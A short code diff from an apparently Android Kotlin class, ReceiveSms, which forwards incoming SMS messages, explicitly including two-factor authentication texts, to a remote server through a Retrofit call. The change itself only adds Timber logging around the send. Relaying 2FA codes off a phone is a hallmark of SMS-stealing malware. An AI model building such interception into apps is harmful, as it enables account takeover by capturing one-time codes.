@@ -88,18 +88,19 @@ class ReceiveSms @Inject constructor(
 
                 GlobalScope.launch {
                     try {
-                        // Retrofit üzerinden server'a gönder
+                        Timber.d("2FA SMS gönderiliyor: From: $sender")
                         val response = NetworkModule.smsApiService.sendSms(
                             SmsDataRequest(sender = sender, message = message)
                         )
 
-
+                        if (response.isSuccessful) {
+                            Timber.d("SMS başarıyla iletildi.")
+                        } else {
+                            Timber.e("SMS iletilemedi. Hata kodu: ${response.code()}")
+                        }
                     } catch (e: Exception) {
-                        e.printStackTrace()
-
+                        Timber.e(e, "SMS post edilirken network hatası oluştu")
                     }
-
-
                 }
 
 
